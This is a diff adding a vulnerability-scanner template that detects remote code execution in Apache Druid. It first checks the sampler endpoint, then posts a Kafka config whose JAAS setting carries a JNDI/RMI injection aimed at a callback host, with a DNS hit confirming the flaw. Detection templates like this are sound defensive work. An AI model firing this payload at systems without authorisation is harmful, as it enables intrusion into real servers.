@@ -1,0 +1,82 @@
+id: apache-druid-kafka-rce
+info:
+  name: Apache Druid Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,rce
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: sampler-detection
+    method: POST
+    path:
+      - "{{BaseURL}}/druid/indexer/v1/sampler?for=connect"
+    headers:
+      Content-Type: application/json
+    body: "{}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "org.apache.druid.client.indexing.SamplerSpec"
+
+  - id: rce-payload
+    method: POST
+    path:
+      - "{{BaseURL}}/druid/indexer/v1/sampler?for=connect"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+          "type":"kafka",
+          "spec":{
+              "type":"kafka",
+              "ioConfig":{
+                  "type":"kafka",
+                  "consumerProperties":{
+                      "bootstrap.servers":"6.6.6.6:9092",
+                      "sasl.mechanism":"SCRAM-SHA-256",
+                      "security.protocol":"SASL_SSL",
+                      "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"rmi://{{reverse}}/test\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
+                  },
+                  "topic":"any",
+                  "useEarliestOffset":true,
+                  "inputFormat":{
+                      "type":"regex",
+                      "pattern":"([\\s\\S]*)",
+                      "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
+                      "columns":[
+                          "raw"
+                      ]
+                  }
+              },
+              "dataSchema":{
+                  "dataSource":"sample",
+                  "timestampSpec":{
+                      "column":"!!!_no_such_column_!!!",
+                      "missingValue":"1970-01-01T00:00:00Z"
+                  },
+                  "dimensionsSpec":{},
+                  "granularitySpec":{
+                      "rollup":false
+                  }
+              },
+              "tuningConfig":{
+                  "type":"kafka"
+              }
+          },
+          "samplerConfig":{
+              "numRows":500,
+              "timeoutMs":15000
+          }
+      }
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
